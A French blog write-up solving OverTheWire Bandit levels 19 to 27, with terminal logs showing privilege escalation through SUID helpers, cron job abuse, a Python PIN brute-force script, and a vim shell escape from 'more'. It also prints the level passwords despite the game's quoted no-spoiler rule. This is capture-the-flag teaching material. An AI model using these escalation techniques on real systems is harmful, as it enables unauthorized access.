---
layout: post
title: OverTheWire - Bandit 4 - Elevation de privilèges
subtitle: OverTheWire - Bandit - Level 19 → 27 - SUID, Cron, Vim
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
gh-badge: [star]
tags: [Waregame, CTF, OverTheWire, Elevation de privilèges, EoP, SUID, Cron, More, Vim, Python, Bruteforce, Commandes, Linux, Write-Up]
comments: false
---

**Le wargame d'Over The Wire permet d'effectuer des élévations de privilège (EoP) dans un environnement Linux. Voici les solutions des challs exploitant le flag SUID, le processus cron ou encore la commande More en passant par Vim**

# bandit20 - SUID 1

~~~
bandit19@bandit:~$ ls -la
total 28
drwxr-xr-x  2 root     root     4096 May  7 20:14 .
drwxr-xr-x 41 root     root     4096 May  7 20:14 ..
-rwsr-x---  1 bandit20 bandit19 7296 May  7 20:14 bandit20-do
-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
-rw-r--r--  1 root     root      675 May 15  2017 .profile
bandit19@bandit:~$ ./bandit20-do
Run a command as another user.
  Example: ./bandit20-do id
bandit19@bandit:~$ ./bandit20-do id
uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
bandit19@bandit:~$ ./bandit20-do cat .profile
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
        . "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi
bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/
cat: /etc/bandit_pass/: Is a directory
bandit19@bandit:~$ ./bandit20-do ls /etc/bandit_pass/
bandit0   bandit11  bandit14  bandit17  bandit2   bandit22  bandit25  bandit28  bandit30  bandit33  bandit6  bandit9
bandit1   bandit12  bandit15  bandit18  bandit20  bandit23  bandit26  bandit29  bandit31  bandit4   bandit7
bandit10  bandit13  bandit16  bandit19  bandit21  bandit24  bandit27  bandit3   bandit32  bandit5   bandit8
bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
bandit19@bandit:~$
~~~

# bandit21 - SUID 2

On utilise tmux, on ouvre un listener d'un côté et on utilise le fichier suid de l'autre

~~~
bandit20@bandit:~$ ls -la                                   │bandit20@bandit:~$ nc -nlvp 1234
total 32                                                    │listening on [any] 1234 ...
drwxr-xr-x  2 root     root      4096 May  7 20:14 .        │connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 33430
drwxr-xr-x 41 root     root      4096 May  7 20:14 ..       │GbKksEFF4yrVs6il55v6gwY5aVje5f0j
-rw-r--r--  1 root     root       220 May 15  2017 .bash_log│gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
out                                                         │bandit20@bandit:~$
-rw-r--r--  1 root     root      3526 May 15  2017 .bashrc  │
-rw-r--r--  1 root     root       675 May 15  2017 .profile │
-rwsr-x---  1 bandit21 bandit20 12088 May  7 20:14 suconnect│
bandit20@bandit:~$ ./suconnect 1234                         │
GbKksEFF4yrVs6il55v6gwY5aVje5f0j                            │
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j                      │
Password matches, sending next password                     │
bandit20@bandit:~$ GbKksEFF4yrVs6il55v6gwY5aVje5f0j         │
-bash: GbKksEFF4yrVs6il55v6gwY5aVje5f0j: command not found  │
bandit20@bandit:~$                                          │
~~~

# bandit22 - Cron 1

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed

~~~
bandit21@bandit:~$ ls -la
total 24
drwxr-xr-x  2 root     root     4096 May  7 20:14 .
drwxr-xr-x 41 root     root     4096 May  7 20:14 ..
-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
-r--------  1 bandit21 bandit21   33 May  7 20:14 .prevpass
-rw-r--r--  1 root     root      675 May 15  2017 .profile
bandit21@bandit:~$ cd /etc/cron.d
bandit21@bandit:/etc/cron.d$ ls -la
total 24
drwxr-xr-x  2 root root 4096 May  7 20:14 .
drwxr-xr-x 87 root root 4096 May  7 20:14 ..
-rw-r--r--  1 root root  120 May  7 20:14 cronjob_bandit22
-rw-r--r--  1 root root  122 May  7 20:14 cronjob_bandit23
-rw-r--r--  1 root root  120 May  7 20:14 cronjob_bandit24
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
bandit21@bandit:/etc/cron.d$
~~~

# bandit23 - Cron 2

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

~~~
bandit22@bandit:~$ cd /etc/cron.d
bandit22@bandit:/etc/cron.d$ ls -la
total 24
drwxr-xr-x  2 root root 4096 May  7 20:14 .
drwxr-xr-x 87 root root 4096 May  7 20:14 ..
-rw-r--r--  1 root root  120 May  7 20:14 cronjob_bandit22
-rw-r--r--  1 root root  122 May  7 20:14 cronjob_bandit23
-rw-r--r--  1 root root  120 May  7 20:14 cronjob_bandit24
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
bandit22@bandit:/etc/cron.d$ whoami
bandit22
bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
bandit22@bandit:/etc/cron.d$
~~~

# bandit24 (se loguer avec les credentials de bandit17) - Cron 3

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

~~~
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit2
cat: cronjob_bandit2: No such file or directory
bandit23@bandit:/etc/cron.d$ clear
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        timeout -s 9 60 ./$i
        rm -f ./$i
    fi
done


bandit23@bandit:/etc/cron.d$ mkdir /tmp/xss0rz
bandit23@bandit:/etc/cron.d$ chmod -R 777 /tmp/xss0rz
bandit23@bandit:/etc/cron.d$ ls -la /tmp/xss0rz
total 24
drwxrwxrwx   2 bandit23 root  4096 May  8 12:51 .
drwxrws-wt 270 root     root 20480 May  8 12:52 ..
bandit23@bandit:/etc/cron.d$ vim /tmp/xss0rz/poc.sh
bandit23@bandit:/etc/cron.d$ cat /tmp/xss0rz/poc.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/xss0rz/pass
bandit23@bandit:/etc/cron.d$ chmod 777 /tmp/xss0rz/poc.sh
bandit23@bandit:/etc/cron.d$ ls -la /tmp/xss0rz/poc.sh
-rwxrwxrwx 1 bandit23 bandit23 61 May  8 12:53 /tmp/xss0rz/poc.sh
bandit23@bandit:/etc/cron.d$ touch /tmp/xss0rz/pass
bandit23@bandit:/etc/cron.d$ chmod 777 /tmp/xss0rz/pass
bandit23@bandit:/etc/cron.d$ cp /tmp/xss0rz/poc.sh /var/spool/bandit24/
bandit23@bandit:/etc/cron.d$ ls -la /var/spool/bandit24/poc.sh
ls: cannot access '/var/spool/bandit24/poc.sh': No such file or directory
bandit23@bandit:/etc/cron.d$ ls -la /tmp/xss0rz
total 32
drwxrwxrwx   2 bandit23 root      4096 May  8 12:54 .
drwxrws-wt 270 root     root     20480 May  8 12:55 ..
-rwxrwxrwx   1 bandit23 bandit23    33 May  8 12:55 pass
-rwxrwxrwx   1 bandit23 bandit23    61 May  8 12:53 poc.sh
bandit23@bandit:/etc/cron.d$ cat /tmp/xss0rz/pass
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
~~~

# bandit25

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

~~~
bandit23@bandit:/tmp/b25$ cat poc.py
#!/usr/bin/env python

import socket

pin=0
passwd = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 30002))
s.recv(1024)
while True:
    if pin < 10 :
        print '<10'
        str_pin = '000' + str(pin)
        print 'Sending :' + str_pin
    elif pin < 100:
        print '<100'
        str_pin = '00' + str(pin)
        print 'Sending :' + str_pin
    elif pin < 1000:
        print '<1000'
        str_pin = '0' + str(pin)
        print 'Sending :' + str_pin
    else:
        str_pin = str(pin)
    #print 'Sending: ' + str(pin)
    s.sendall(passwd +' ' + str_pin + '\n')
    data = s.recv(1024)
    print data
    if 'Wrong!' not in data:
        print '##################################################'
        print '##   ' + ' Pinecode ;' + str_pin
        print '##################################################'
    pin += 1


bandit23@bandit:/tmp/b25$pytoh poc.py
(...)
<1000
Sending :0848
Wrong! Please enter the correct pincode. Try again.

<1000
Sending :0849
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.

##################################################
##    Pinecode ;0849
##################################################
~~~

# bandit26 - More -­­­> Vim

~~~
bandit25@bandit:~$ ls -la
total 32
drwxr-xr-x  2 root     root     4096 May  7 20:14 .
drwxr-xr-x 41 root     root     4096 May  7 20:14 ..
-rw-r-----  1 bandit25 bandit25   33 May  7 20:14 .bandit24.password
-r--------  1 bandit25 bandit25 1679 May  7 20:14 bandit26.sshkey
-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
-rw-r-----  1 bandit25 bandit25    4 May  7 20:14 .pin
-rw-r--r--  1 root     root      675 May 15  2017 .profile
bandit25@bandit:~$ ssh bandit26@localhost -i bandit26.sshkey
Could not create directory '/home/bandit25/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

Linux bandit.otw.local 5.4.8 x86_64 GNU/Linux

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * gef (https://github.com/hugsy/gef) in /usr/local/gef/
    * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/
    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
Connection to localhost closed.
bandit25@bandit:~$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

more ~/text.txt
exit 0
bandit25@bandit:~$

On réduit la taille du terminal au maximum pour piéger more. lancer la commande ssh et quand en mode More appuyer sur v pour entrer dans vim

Dans vim
:set shell=/bin/sh
:shell

$ cat /etc/bandit_pass/bandit26
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
$
~~~

Ref: https://gtfobins.github.io/gtfobins/vim/

# bandit27 - More -­­­> Vim

Comme pour bandit26, on lance ssh -i bandit26.sshkey bandit26@localhost à partir de bandit25 en ayant réduit la taille du terminal pour faire aparaitre More.
Quand on est dans More appuyer sur v pour entrer dans Vim et exploiter Vim

~~~
:set shell=/bin/sh
:shell
[No write since last change]
$ id
uid=11026(bandit26) gid=11026(bandit26) groups=11026(bandit26)
$ ls
bandit27-do  text.txt
$ ls -la
total 36
drwxr-xr-x  3 root     root     4096 May  7 20:14 .
drwxr-xr-x 41 root     root     4096 May  7 20:14 ..
-rwsr-x---  1 bandit27 bandit26 7296 May  7 20:14 bandit27-do
-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
-rw-r--r--  1 root     root      675 May 15  2017 .profile
drwxr-xr-x  2 root     root     4096 May  7 20:14 .ssh
-rw-r-----  1 bandit26 bandit26  258 May  7 20:14 text.txt
$ ./bandit27-do
Run a command as another user.
  Example: ./bandit27-do id
$ ./bandit27-do cat /etc/bandit_pass/bandit27
3ba3118a22e93127a4ed485be72ef5ea
$
~~~

**Retrouvez les solutions :**
- pour les niveaux 0 à 10 : [OverTheWire -Bandit 1](https://0xss0rz.github.io/2019-08-20-OverTheWire-Bandit-1-Write-Ups/)
- pour les niveaux 11 à 23 : [OverTheWire - Bandit 2](https://0xss0rz.github.io/2019-08-22-OverTheWire-Bandit-2-Write-Ups/)
- pour la partie réseau, SSH, SSL et telnet: [OverTheWire - Bandit 3](https://0xss0rz.github.io/2020-05-16-OverTheWire-Bandit-3-SSH-Part/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
